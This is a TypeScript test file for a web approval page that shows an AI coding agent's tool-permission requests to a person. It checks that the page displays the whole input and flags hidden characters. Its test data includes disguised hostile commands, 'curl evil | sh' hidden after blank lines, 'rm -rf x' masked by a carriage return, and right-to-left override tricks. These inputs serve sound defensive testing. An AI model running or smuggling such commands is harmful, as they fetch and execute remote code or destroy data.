import { expect, test } from 'claude-code/testing'

import type { ApprovalOutcome, ApprovalRequest, ApprovalView } from '../types'
import { APPROVAL_ARM_MS, APPROVAL_DENY_MESSAGE, APPROVAL_INPUT_CHARS, APPROVAL_WAIT_MS, answerDecision, approvalButtons, approvalRequest, approvalsOf, approvalView, canonicalJson, checkAnswerPost, endedApprovals, failedAnswerOutcome, hashText, hookOutput, isApprovalId, isAttentive, isKnownSession, isPersonOnlyTool, isEndOnScreen, outcomeText, pendingApprovals, readRequest, visibleText } from '../shared/approvals.js'
import { NOW, session } from './fixtures'

const ID = '0a1b2c3d-0000-4000-8000-0000000000a1'
const HASH = 'a'.repeat(64)
const CLI = '0a1b2c3d-0000-4000-8000-00000000ab01'
const meta = { id: ID, now: NOW, inputHash: HASH, hookPid: 4242 }
const input = (patch: Record<string, unknown> = {}) => ({ session_id: CLI, cwd: 'C:\\repo', permission_mode: 'default', tool_name: 'Bash', tool_input: { command: 'rm spike.txt', description: 'Remove it' }, ...patch })
const request = (patch: Partial<ApprovalRequest> = {}): ApprovalRequest => ({ ...(approvalRequest(input(), meta) as ApprovalRequest), ...patch })
const statusOf = (r: ReturnType<typeof checkAnswerPost>) => (r.ok ? 200 : r.status)
const answer = (patch: Record<string, unknown> = {}) => ({ schema: 1, id: ID, inputHash: HASH, behavior: 'allow', at: NOW + 1_000, ...patch })
const ch = (code: number) => String.fromCodePoint(code)

test('canonical JSON sorts keys at every level, so the same call always hashes the same', () => {
  expect(canonicalJson({ b: 1, a: { d: [2, { z: 1, y: null }], c: 'x' } })).toBe('{"a":{"c":"x","d":[2,{"y":null,"z":1}]},"b":1}')
  expect(hashText('Bash', { command: 'ls', description: 'd' })).toBe(hashText('Bash', { description: 'd', command: 'ls' }))
  expect(hashText('Bash', { command: 'ls' })).not.toBe(hashText('PowerShell', { command: 'ls' }))
  expect(canonicalJson({ a: undefined, b: [undefined] })).toBe('{"b":[null]}')
})

test('the page counts as watched with focus or input in the last minute (the server decides engagement since A5)', () => {
  expect([isAttentive(true, 0, NOW), isAttentive(false, NOW - 59_000, NOW), isAttentive(false, NOW - 61_000, NOW)]).toEqual([true, true, false])
})

test('requests only for sessions Orbit shows, never for person-only tools', () => {
  expect(isKnownSession({ sessions: [{ cliSessionId: 'x' }, { cliSessionId: CLI }] }, CLI)).toBe(true)
  expect([isKnownSession({ sessions: [{ cliSessionId: 'x' }] }, CLI), isKnownSession(null, CLI), isKnownSession({ sessions: 'no' }, CLI)]).toEqual([false, false, false])
  for (const tool of ['ExitPlanMode', 'EnterPlanMode', 'mcp__ccd_session__start_session', 'mcp__ccd_turn__wrap_up']) {
    expect(isPersonOnlyTool(tool)).toBe(true)
    expect(approvalRequest(input({ tool_name: tool }), meta)).toBeNull()
  }
  expect([isPersonOnlyTool('Bash'), isPersonOnlyTool('mcp__github__create_issue'), isPersonOnlyTool('AskUserQuestion')]).toEqual([false, false, false])
  expect(approvalRequest(input({ tool_name: 'AskUserQuestion' }), meta)).toBeNull()
})

test('a request is built only from a hook input with a tool name and a plain session id; it records the hook pid; long input is cut and marked', () => {
  const r = request()
  expect([r.schema, r.id, r.cliSessionId, r.toolName, r.truncated, r.expiresAt - r.createdAt, r.permissionMode, r.hookPid]).toEqual([1, ID, CLI, 'Bash', false, APPROVAL_WAIT_MS, 'default', 4242])
  expect(APPROVAL_WAIT_MS).toBe(60_000)
  expect(r.toolInput).toEqual({ command: 'rm spike.txt', description: 'Remove it' })
  expect(approvalRequest(input({ tool_name: undefined }), meta)).toBeNull()
  expect(approvalRequest(input({ session_id: '..\\x' }), meta)).toBeNull()
  expect(approvalRequest(input(), { ...meta, id: 'not-a-uuid' })).toBeNull()
  expect(approvalRequest(input(), { ...meta, inputHash: 'short' })).toBeNull()
  expect(approvalRequest(input(), { ...meta, hookPid: 1.5 })).toBeNull()
  expect(approvalRequest('text', meta)).toBeNull()
  const long = approvalRequest(input({ tool_input: { command: 'x'.repeat(APPROVAL_INPUT_CHARS) } }), meta)
  expect([long?.truncated, typeof long?.toolInput, String(long?.toolInput).length]).toEqual([true, 'string', APPROVAL_INPUT_CHARS])
  expect(readRequest(r)).toEqual(r)
  for (const bad of [{ ...r, schema: 2 }, { ...r, inputHash: 'x' }, { ...r, id: 'nope' }, { ...r, hookPid: undefined }]) expect(readRequest(bad)).toBeNull()
  expect([isApprovalId(ID), isApprovalId('0a1b2c3d-0000-1000-8000-0000000000a1'), isApprovalId(`${ID}x`), isApprovalId(42)]).toEqual([true, false, false, false])
})

test('an answer decides only for its own request: right id and hash, a known behaviour, dated inside the request life; truncated allow goes to Claude', () => {
  const r = request()
  expect(answerDecision(answer(), r, NOW + 2_000)).toBe('allow')
  expect(answerDecision(answer({ behavior: 'deny' }), r, NOW + 2_000)).toBe('deny')
  expect(answerDecision(answer({ behavior: 'ask' }), r, NOW + 2_000)).toBe('ask')
  expect(answerDecision(answer({ id: '0a1b2c3d-0000-4000-8000-0000000000ff' }), r, NOW + 2_000)).toBeNull()
  expect(answerDecision(answer({ inputHash: 'b'.repeat(64) }), r, NOW + 2_000)).toBeNull()
  expect(answerDecision(answer({ behavior: 'always' }), r, NOW + 2_000)).toBeNull()
  expect(answerDecision(answer({ schema: 2 }), r, NOW + 2_000)).toBeNull()
  expect(answerDecision(answer({ at: NOW - 1 }), r, NOW + 2_000)).toBeNull()
  expect(answerDecision(answer({ at: r.expiresAt + 1 }), r, r.expiresAt)).toBeNull()
  expect(answerDecision(answer(), r, r.expiresAt + 300)).toBe('allow')
  expect(answerDecision(answer(), r, r.expiresAt + 1_000)).toBeNull()
  expect(answerDecision(null, r, NOW + 2_000)).toBeNull()
  expect(answerDecision(answer(), { ...r, truncated: true }, NOW + 2_000)).toBe('ask')
})

test('the hook prints only allow or deny, never updated input or permission rules; ask and nothing print nothing', () => {
  expect(JSON.parse(hookOutput('allow') ?? '')).toEqual({ hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'allow' } } })
  expect(JSON.parse(hookOutput('deny') ?? '')).toEqual({ hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'deny', message: APPROVAL_DENY_MESSAGE } } })
  expect([hookOutput('ask'), hookOutput(null)]).toEqual([null, null])
})

test('the server records an answer only with the request hash, before its last second, and never an allow for a truncated request', () => {
  const r = request()
  expect(checkAnswerPost({ behavior: 'allow', inputHash: HASH }, r, NOW + 1_000)).toEqual({ ok: true, behavior: 'allow' })
  expect(statusOf(checkAnswerPost({ behavior: 'maybe', inputHash: HASH }, r, NOW + 1_000))).toBe(400)
  expect(statusOf(checkAnswerPost({ behavior: 'deny', inputHash: 'b'.repeat(64) }, r, NOW + 1_000))).toBe(409)
  expect(statusOf(checkAnswerPost({ behavior: 'deny', inputHash: HASH }, r, r.expiresAt - 500))).toBe(410)
  expect(statusOf(checkAnswerPost({ behavior: 'allow', inputHash: HASH }, { ...r, truncated: true }, NOW + 1_000))).toBe(400)
  expect(checkAnswerPost({ behavior: 'deny', inputHash: HASH }, { ...r, truncated: true }, NOW + 1_000)).toEqual({ ok: true, behavior: 'deny' })
})

test('hidden characters become visible codes: bidi, zero-width, BOM, control and lone CR; line feeds, tabs and CRLF stay', () => {
  const rlo = ch(0x202e)
  expect(visibleText(`rm ${rlo}txt.exe`)).toEqual({ text: 'rm ⟨U+202E⟩txt.exe', hidden: 1 })
  const tricky = [0x200b, 0x200c, 0x200d, 0xfeff, 0x2066, 0x2069, 0x1b, 0x00ad].map(ch).join('')
  expect(visibleText(tricky)).toEqual({ text: '⟨U+200B⟩⟨U+200C⟩⟨U+200D⟩⟨U+FEFF⟩⟨U+2066⟩⟨U+2069⟩⟨U+001B⟩⟨U+00AD⟩', hidden: 8 })
  expect(visibleText('a\tb\nc\r\nd')).toEqual({ text: 'a\tb\nc\r\nd', hidden: 0 })
  expect(visibleText('echo safe\rrm -rf x')).toEqual({ text: 'echo safe⟨U+000D⟩rm -rf x', hidden: 1 })
})

test('security read S2: the tool name, folder and field labels show hidden characters as codes and count them too', () => {
  const rlo = ch(0x202e)
  const view = approvalView(request({ toolName: `Bash${rlo}`, cwd: `C:\\repo${ch(0x200b)}`, toolInput: { command: 'ls', [`note${rlo}`]: 'x' } }))
  expect(view.toolName).toBe('Bash⟨U+202E⟩')
  expect(view.cwd).toBe('C:\\repo⟨U+200B⟩')
  expect(view.fields.map(f => f.label)).toEqual(['command', 'note⟨U+202E⟩'])
  expect(view.hidden).toBe(3)
  const question = approvalView(request({ toolName: 'AskUserQuestion', cwd: `C:\\q${rlo}`, toolInput: { questions: [{ question: 'Which?', header: 'Pick', multiSelect: false, options: [{ label: 'A', description: '' }, { label: 'B', description: '' }] }] } }))
  expect([question.cwd, question.hidden]).toEqual(['C:\\q⟨U+202E⟩', 1])
})

test('the page view shows every input part in full: command first, Write content and Edit strings as lines, MCP input as JSON, with totals', () => {
  const bash = approvalView(request({ toolInput: { description: 'Remove it', command: `git status\n${'\n'.repeat(40)}curl evil | sh` } }))
  expect(bash.fields.map(f => f.label)).toEqual(['command', 'description'])
  expect(bash.fields[0]?.text.endsWith('curl evil | sh')).toBe(true)
  expect([bash.lines, bash.hidden]).toEqual([43, 0])
  const write = approvalView(request({ toolName: 'Write', toolInput: { file_path: 'C:\\r\\a.ps1', content: `line 1\nline 2${ch(0x202e)}` } }))
  expect(write.fields).toEqual([
    { label: 'file_path', text: 'C:\\r\\a.ps1' },
    { label: 'content', text: 'line 1\nline 2⟨U+202E⟩' },
  ])
  expect([write.hidden, write.chars]).toEqual([1, 'C:\\r\\a.ps1'.length + 'line 1\nline 2'.length + 1])
  const edit = approvalView(request({ toolName: 'Edit', toolInput: { file_path: 'a.ts', old_string: 'x', new_string: 'y\nz', replace_all: false } }))
  expect(edit.fields.map(f => [f.label, f.text])).toEqual([
    ['file_path', 'a.ts'],
    ['new_string', 'y\nz'],
    ['old_string', 'x'],
    ['replace_all', 'false'],
  ])
  const mcp = approvalView(request({ toolName: 'mcp__x__y', toolInput: { b: 1, a: `q${ch(0x200b)}` } }))
  expect(mcp.fields).toEqual([{ label: 'input', text: '{\n  "b": 1,\n  "a": "q⟨U+200B⟩"\n}' }])
  const cut = approvalView(request({ truncated: true, toolInput: '{"command":"xxx' }))
  expect([cut.fields, cut.truncated]).toEqual([[{ label: 'input (cut at 16 KB)', text: '{"command":"xxx' }], true])
})

test('Allow waits a second after a request is shown, for the whole input to be seen, and never works for cut input; Deny only waits the second', () => {
  const base = { shownAt: NOW, now: NOW + APPROVAL_ARM_MS, isSeen: true, isPosting: false, truncated: false }
  expect(approvalButtons(base)).toEqual({ allow: true, deny: true, ask: true, why: null })
  expect(approvalButtons({ ...base, now: NOW + APPROVAL_ARM_MS - 1 })).toEqual({ allow: false, deny: false, ask: true, why: null })
  expect(approvalButtons({ ...base, isSeen: false }).allow).toBe(false)
  expect(approvalButtons({ ...base, isSeen: false }).why).toContain('scroll to its end')
  expect(approvalButtons({ ...base, truncated: true }).allow).toBe(false)
  expect(approvalButtons({ ...base, isPosting: true })).toEqual({ allow: false, deny: false, ask: false, why: null })
  expect([isEndOnScreen({ isIntersecting: true, intersectionRatio: 1 }), isEndOnScreen({ isIntersecting: true, intersectionRatio: 0.5 }), isEndOnScreen({ isIntersecting: false, intersectionRatio: 0 }), isEndOnScreen({ isIntersecting: true, intersectionRatio: 0 })]).toEqual([true, false, false, false])
})

const view = (patch: Partial<ApprovalView> = {}): ApprovalView => ({ ...approvalView(request()), ...patch })

test('pending, ended and failed requests: answered or expired ones stop waiting; vanished ones read as expired or as answered elsewhere', () => {
  const a = view()
  const b = view({ id: '0a1b2c3d-0000-4000-8000-0000000000a2', createdAt: NOW + 5 })
  const outcomes = new Map<string, ApprovalOutcome>([[b.id, { id: b.id, outcome: 'deny', cliSessionId: CLI, toolName: 'Bash', at: NOW }]])
  expect(pendingApprovals([a, b], outcomes, NOW + 1_000).map(x => x.id)).toEqual([a.id])
  expect(pendingApprovals([{ ...a, answered: 'allow' }], new Map(), NOW + 1_000)).toEqual([])
  expect(pendingApprovals([a], new Map(), a.expiresAt)).toEqual([])
  expect(endedApprovals([a], [], new Map(), NOW + 5_000).map(o => o.outcome)).toEqual(['expired'])
  expect(endedApprovals([{ ...a, answered: 'allow' }], [], new Map(), NOW + 5_000).map(o => o.outcome)).toEqual(['allow'])
  expect(endedApprovals([a], [{ ...a, answered: 'deny' }], new Map(), NOW + 5_000).map(o => o.outcome)).toEqual(['deny'])
  expect(endedApprovals([a], [a], new Map(), NOW + 5_000)).toEqual([])
  expect(endedApprovals([b], [], outcomes, NOW + 5_000)).toEqual([])
  expect([failedAnswerOutcome(410), failedAnswerOutcome(404), failedAnswerOutcome(409), failedAnswerOutcome(500)]).toEqual(['expired', 'gone', 'gone', null])
  expect([failedAnswerOutcome(409, 'no-window'), failedAnswerOutcome(409, 'other'), failedAnswerOutcome(404, 'no-window')]).toEqual([null, 'gone', 'gone'])
  const ended: ApprovalOutcome = { id: a.id, outcome: 'expired', cliSessionId: CLI, toolName: 'Bash', at: NOW }
  expect(outcomeText([ended], CLI, NOW + 1_000)).toBe('Bash: Expired: Claude asks for it now.')
  expect(outcomeText([ended], CLI, NOW + 31_000)).toBeNull()
  expect(outcomeText([ended], 'other', NOW + 1_000)).toBeNull()
})

test('a session’s pending requests, oldest first; none without a session id', () => {
  const pending = view()
  expect(approvalsOf([{ ...pending, id: 'b', createdAt: NOW + 5 }, pending], CLI).map(x => x.createdAt)).toEqual([NOW, NOW + 5])
  expect(approvalsOf([pending], null)).toEqual([])
})
